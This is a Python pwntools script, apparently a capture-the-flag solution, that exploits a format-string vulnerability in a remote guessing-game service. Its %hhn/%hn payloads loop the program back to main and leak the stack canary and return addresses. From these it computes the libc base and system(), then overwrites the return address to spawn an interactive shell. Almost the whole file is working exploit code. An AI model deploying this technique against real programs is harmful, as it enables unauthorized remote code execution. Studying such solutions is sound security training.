import random
import time
from pwn import *
from struct import unpack
context.clear(arch = 'amd64')

Real = False
if not Real:
    host = '127.0.0.1'
    port = 3006
    special_char = b'\xc8'
    parm = 25
    pad = b''
else:
    host = 'host1.metaproblems.com'
    port = 5470
    special_char = b'\xc8'
    parm = 26
    pad = b'PPPPPPP.'


payload_loop   = f'%148c%{parm}$hhn.%.16llx.PPP'.encode('ascii') +pad+ special_char
payload_canary = f'%148c%{parm}$hhn.%35$.16llx.'.encode('ascii') +pad+ special_char
payload_rip    = f'%148c%{parm}$hhn.%37$.16llx.'.encode('ascii') +pad+ special_char
payload_main   = f'%148c%{parm}$hhn.%41$.16llx.'.encode('ascii') +pad+ special_char

libc_system = 0x449C0
libc_sh     = 0x1607b5

def call_main(s, d):
    # we've landed a payload that loops to start of main
    # read leaked stack address
    print(d)
    d = d.replace(b'Your guessed wrong with ',b'')
    index = d.index(b'\nWhat is your guess')
    d = d[ :index]
    d = d[149: ]
    d = d.split(b'.', 1)
    addr_lib = d[0]
    addr_lib = int(addr_lib.decode('ascii'), 16)
    addr_ret = d[-1] + b'\x00\x00'
    addr_ret = addr_ret[-8: ]
    addr_ret = unpack("Q", addr_ret)[0]
    addr_stack = addr_ret + 8
    print("Addr Ret", hex(addr_ret))
    print("Addr Lib", hex(addr_lib))
    print("Addr Stk", hex(addr_stack))

    s.send(payload_canary)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        value_canary = d[0]
        value_canary = int(value_canary.decode('ascii'), 16)
        print("Canary", hex(value_canary))
    except Exception as ex:
        print(repr(ex))
        s.interactive()
    
    s.send(payload_rip)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        addr_rip = d[0]
        addr_rip = int(addr_rip.decode('ascii'), 16)
        print("Addr RIP", hex(addr_rip))
    except Exception as ex:
        print(ex)
        s.interactive()
    
    s.send(payload_main)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        addr_main = d[0]
        addr_main = int(addr_main.decode('ascii'), 16)
        print("Addr Main", hex(addr_main))
    except Exception as ex:
        print(ex)
        #s.interactive()
    
    addr_libc = addr_rip - 0x1409b
    print("Addr Libc Base", hex(addr_libc))
    addr_system = addr_libc + libc_system
    print("Addr Libc System", hex(addr_system))

    input('> ')

    # needs to go after any formatting

    # prepare RET to jump to
    value_addr_systen = p64(addr_system)
    a = [ [idx+22, unpack("H", value_addr_systen[ x: x+2 ])[0]] for idx, x in enumerate(range(0, 6, 2)) ]
    a = sorted(a, key=lambda x: x[1])
    a[1][1] -= a[0][1]
    a[2][1] -= a[0][1] + a[1][1]
    
    payload  = b'sh||'  # this is where we will land
    payload += f'%1${a[0][1]}c%{a[0][0]}$hn'.encode('ascii')
    payload += f'%1${a[1][1]}c%{a[1][0]}$hn'.encode('ascii')
    payload += f'%1${a[2][1]}c%{a[2][0]}$hn'.encode('ascii')
    payload += b'\x00'* (8 - (len(payload) % 8))
    param_skip = len(payload) // 8
    for pj, _ in a:
        seek = f'%{pj}$'.encode('ascii')
        repl = f'%{pj+param_skip}$'.encode('ascii')
        payload = payload.replace(seek, repl, 1)
    payload += p64(addr_ret+0)
    payload += p64(addr_ret+2)
    payload += p64(addr_ret+4)
    print(payload)
    s.send(payload)
    s.interactive()


'''
s = remote(host, port)
d = s.recvuntil(b'?\n')
results = []
for i in [ 13, 31, 40]:
    payload_start = f'%{i}$.16llx.%{i+1}$.16llx.%{i+2}$.16llx.%{i+3}$.16llx.%{i+4}$.16llx.%{i+5}$.16llx.%{i+6}$.16llx.%{i+7}$.16llx.%{i+8}$.16llx.P'.encode('ascii')
    s.send(payload_start)
    s.recvuntil(b'Your guessed wrong with ')
    d = s.recvuntil(b'.P')
    d = d[ :-2]
    d = d.split(b'.') 
    for j, n in enumerate(d):
        param_n = int(n.decode('ascii'), 16)
        results.append(f"Param {i+j}: " + hex(param_n))
    results.append('')
    s.close()
    s = remote(host, port)
    d = s.recvuntil(b'?\n')
for i in [ 25, 28]:
    payload_start = f'%{i}$llx.%{i+1}$llx.%{i+2}$llxP'.encode('ascii')
    s.send(payload_start)
    s.recvuntil(b'Your guessed wrong with ')
    d = s.recvuntil(b'P')
    d = d[ :-1]
    d = d.split(b'.') 
    for j, n in enumerate(d):
        param_n = int(n.decode('ascii'), 16)
        results.append(f"Param {i+j}: " + hex(param_n))
    results.append('')
    s.close()
    s = remote(host, port)
    d = s.recvuntil(b'?\n')
s.close()
for r in results:
    print(r)

s.close()
time.sleep(1)
'''

s = remote(host, port)
d = s.recvuntil(b'?\n')
while True:
    print(d)
    s.send(payload_loop)
    try:
        d = s.recvuntil(b'?\n')
        call_main(s, d)
        s.close()
        break

    except Exception as ex:
        print(ex)
        s.close()
        time.sleep(1)
        s = remote(host, port)
        d = s.recvuntil(b'?\n')
